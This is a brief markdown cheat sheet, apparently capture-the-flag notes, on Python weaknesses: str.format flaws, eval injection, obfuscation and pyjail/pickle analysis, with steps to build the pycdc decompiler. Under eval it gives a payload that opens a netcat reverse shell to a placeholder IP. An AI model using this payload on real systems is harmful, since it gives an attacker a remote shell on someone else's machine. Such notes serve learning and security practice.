# Python

## vulnerabilities

- [str format](https://www.geeksforgeeks.org/vulnerability-in-str-format-in-python/)
- `eval`, execute system()
  - `"__import__('os').system('nc your_ip port -e /bin/sh')"`

## [obfuscation](../forensics/obfuscation.md#python)

## pyjails

understand pickled code if it executes automatically:

- compile python code to pyc
- decompile pyc with [pycdc](https://github.com/zrax/pycdc) or online
  - how to install pycdc:
    ```sh
      git clone https://github.com/zrax/pycdc
      cd pycdc
      cmake .
      make
    ```

